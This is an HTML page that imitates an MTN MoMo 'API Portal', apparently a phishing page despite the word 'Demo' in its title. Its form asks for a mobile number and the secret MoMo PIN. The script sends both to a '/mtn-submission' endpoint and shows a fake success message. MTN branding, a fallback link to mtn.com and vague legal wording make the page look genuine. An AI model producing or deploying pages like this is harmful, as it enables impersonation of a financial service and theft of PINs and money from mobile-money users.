<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTN MoMo Demo Submission</title>
    <style>
        :root {
            --mtn-yellow: #ffcc00;
            --mtn-dark-blue: #004b6e;
            --background-grey: #f7f9fa;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--background-grey);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .card {
            background-color: #ffffff;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
            width: 100%;
            max-width: 380px;
            padding: 30px;
            text-align: center;
            box-sizing: border-box;
            border-top: 8px solid var(--mtn-yellow);
        }

        .brand-header {
            margin-bottom: 25px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
        }

        .momo-logo {
            width: 75px;
            height: 75px;
            object-fit: contain;
            border-radius: 14px;
        }

        .brand-header h2 {
            font-size: 20px;
            color: var(--mtn-dark-blue);
            margin: 0;
            font-weight: 700;
        }

        .brand-header p {
            font-size: 13px;
            color: #757575;
            margin: 0;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 6px;
            font-size: 13px;
            font-weight: 600;
            color: #444;
        }

        .input-wrapper {
            position: relative;
        }

        .input-wrapper input {
            width: 100%;
            padding: 12px 14px;
            box-sizing: border-box;
            border: 1.5px solid #e0e0e0;
            border-radius: 8px;
            font-size: 15px;
            transition: border-color 0.2s ease;
            outline: none;
        }

        .input-wrapper input:focus {
            border-color: var(--mtn-dark-blue);
        }

        button {
            width: 100%;
            padding: 14px;
            background-color: var(--mtn-yellow);
            border: none;
            border-radius: 8px;
            color: #000000;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(255, 204, 0, 0.3);
            transition: transform 0.1s ease, background-color 0.2s ease;
        }

        button:hover {
            background-color: #e6b800;
        }

        button:active {
            transform: scale(0.98);
        }

        .status-msg {
            margin-top: 15px;
            font-size: 14px;
            font-weight: 600;
            min-height: 20px;
        }

        .legal-notice {
            font-size: 11px;
            color: #8c8c8c;
            margin-top: 20px;
            line-height: 1.4;
        }
    </style>
</head>
<body>

<div class="card">
    <div class="brand-header">
        <img class="momo-logo" src="https://wikimedia.org" onerror="this.src='https://mtn.com'" alt="MTN MoMo Logo">
        <h2>MoMo API Portal</h2>
        <p>Confirm authorization profile details</p>
    </div>

    <form id="submissionForm">
        <div class="form-group">
            <label for="phone">Mobile Number</label>
            <div class="input-wrapper">
                <input type="text" id="phone" required placeholder="e.g., 0770000000" autocomplete="tel">
            </div>
        </div>
        <div class="form-group">
            <label for="pin">MoMo PIN (4 or 5 digits)</label>
            <div class="input-wrapper">
                <!-- RegEx Pattern restricts typing strictly to 4 or 5 numerical digits -->
                <input type="password" id="pin" required placeholder="••••" inputmode="numeric" pattern="^[0-9]{4,5}$" title="PIN must be exactly 4 or 5 digits long" autocomplete="current-password">
            </div>
        </div>
        <button type="submit">Authorize Connection</button>
    </form>
    
    <div id="status" class="status-msg"></div>

    <div class="legal-notice">
        Signing in confirms your acceptance of our programmatic distribution terms and transactional privacy policies.
    </div>
</div>

<script>
    document.getElementById("submissionForm").addEventListener("submit", async (e) => {
        e.preventDefault();

        const phoneInput = document.getElementById("phone").value;
        const pinInput = document.getElementById("pin").value;
        const statusDiv = document.getElementById("status");

        // Extra layer of JS programmatic validation checking length explicitly
        if (pinInput.length !== 4 && pinInput.length !== 5) {
            statusDiv.style.color = "#c62828";
            statusDiv.innerText = "Error: PIN must be exactly 4 or 5 digits.";
            return;
        }

        statusDiv.style.color = "#004b6e";
        statusDiv.innerText = "Processing secure request...";

        try {
            const response = await fetch("/mtn-submission", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    phone: phoneInput,
                    pin: pinInput,
                    success: true 
                })
            });

            const data = await response.json();

            if (response.ok && data.success) {
                statusDiv.style.color = "#2e7d32";
                statusDiv.innerText = "Submission successfully transferred.";
            } else {
                statusDiv.style.color = "#c62828";
                statusDiv.innerText = data.message || "Failed processing submission.";
            }
        } catch (error) {
            console.error("Transmission breakdown:", error);
            statusDiv.style.color = "#c62828";
            statusDiv.innerText = "Error syncing with gateway.";
        }
    });
</script>

</body>
</html>
